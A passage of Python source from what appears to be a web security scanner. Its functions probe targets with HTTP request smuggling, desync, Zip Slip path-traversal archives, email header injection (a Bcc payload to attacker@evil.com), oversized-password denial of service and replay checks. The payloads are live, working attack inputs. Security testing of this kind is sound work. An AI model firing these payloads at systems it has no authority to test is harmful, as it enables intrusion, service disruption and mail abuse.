        return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": True, "details": f"Failed to generate bomb: {e}"}

    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": not issues, "details": issues}
def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Request Smuggling: CL.TE, TE.CL, and TE.TE detection."""
    # This is a complex probe. We send skewed headers to check for frontend/backend desync.
    # We use a safe 'GPOST' technique or 'CL.TE' probe.
    target = scenario.target
    payload = "0\r\n\r\n"
    smuggled_request = (
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "18\r\n"
        "GPOST / HTTP/1.1\r\n"
        "0\r\n\r\n"
    )
    
    # We send the request and see if a subsequent request from a DIFFERENT client (simulated) 
    # receives a 405 or skewed response
    try:
        # Phase 1: Poison
        print(f"    -> [SMUGGLING] Poisoning connection (CL.TE Probe)...")
        client.send("POST", target, raw_body=smuggled_request, headers={"Content-Type": "application/x-www-form-urlencoded"})
        
        # Phase 2: Follow-up check
        time.sleep(0.5)
        resp = client.send("GET", target)
        
        issues = ["HTTP Request Smuggling Detected (Response Skew)"] if resp.status_code == 405 or "GPOST" in resp.text else []
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues, "artifacts": [{"request": smuggled_request, "response": resp.response_dump}] if issues else []}
    except:
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Target reset connection (Potentially mitigated or incompatible)."}

def run_http_desync(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """HTTP Desync: Connection state manipulation."""
    # Simplified version of Smuggling targeting specific backend desync
    headers = {"Connection": "keep-alive", "Content-Length": "100"}
    try:
        resp = client.send("POST", scenario.target, headers=headers, form_body="A"*10, timeout=2)
        issues = ["HTTP Desync / Resource Exhaustion Risk"] if resp.status_code == -1 else [] # -1 indicates timeout in our client wrapper
        return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": not issues, "details": issues}
    except:
        return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": True, "details": "Secure."}



def run_zip_slip(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Zip Slip Attack: Arbitrary file write via path traversal in archive."""
    issues = []
    if scenario.config.get("aggressive"):
        # Real Zip Slip: Create a zip with a traversal filename
        try:
            buffer = io.BytesIO()
            with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                # The malicious file entry
                zf.writestr('../../../../tmp/brk_pwned.txt', 'BREAKPOINT_RCE_TEST')
            
            exploit_zip = buffer.getvalue()
            
            resp = client.send("POST", scenario.target, form_body={"file": ("exploit.zip", exploit_zip, "application/zip")})
            
            if resp.status_code == 200 and ("success" in resp.text.lower() or "uploaded" in resp.text.lower()):
                issues.append("Potential Zip Slip: Server accepted archive with traversal path.")
        except Exception as e:
            pass
            
    return {"scenario_id": scenario.id, "attack_type": "zip_slip", "passed": not issues, "details": issues}

def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Email Header Injection: Adding BCC/CC to outgoing mail forms."""
    payload = "victim@test.com%0aBcc:attacker@evil.com"
    fields = scenario.config.get("fields", ["email", "to", "contact"])
    issues, artifacts = [], []
    for f in fields:
        resp = client.send("POST", scenario.target, json_body={f: payload})
        if resp.status_code == 200 and not any(k in resp.text.lower() for k in ["error", "invalid"]):
            issues.append(f"Potential Email Header Injection in field '{f}'")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
            break
    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_password_length_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Password Length DoS: Sending extremely long passwords to saturate hash functions."""
    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "password_length", "passed": True, "details": "Non-aggressive mode."}
    long_pass = "A" * 100000 
    resp = client.send("POST", scenario.target, json_body={"password": long_pass})
    issues, artifacts = [], []
    if resp.elapsed_ms > 3000:
        issues.append("Password Length DoS: Significant latency during large password hashing")
        artifacts.append({"request": f"POST {scenario.target} (100KB password)", "response": f"Time: {resp.elapsed_ms}ms"})
    return {"scenario_id": scenario.id, "attack_type": "password_length", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_replay_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Simple Auth Replay: Checking if same request works twice without nonce/timestamp change."""
    resp1 = client.send(scenario.method, scenario.target, json_body=scenario.config.get("json_body"))
    resp2 = client.send(scenario.method, scenario.target, json_body=scenario.config.get("json_body"))
    issues, artifacts = [], []
    if resp1.status_code == 200 and resp2.status_code == 200:
        issues.append("Potential Replay Vulnerability: Success on identical consecutive requests")
        artifacts.append({"request": "Duplicate requests sent", "response": "Both returned 200 OK"})
    return {"scenario_id": scenario.id, "attack_type": "replay_check", "passed": not issues, "details": issues, "artifacts": artifacts}

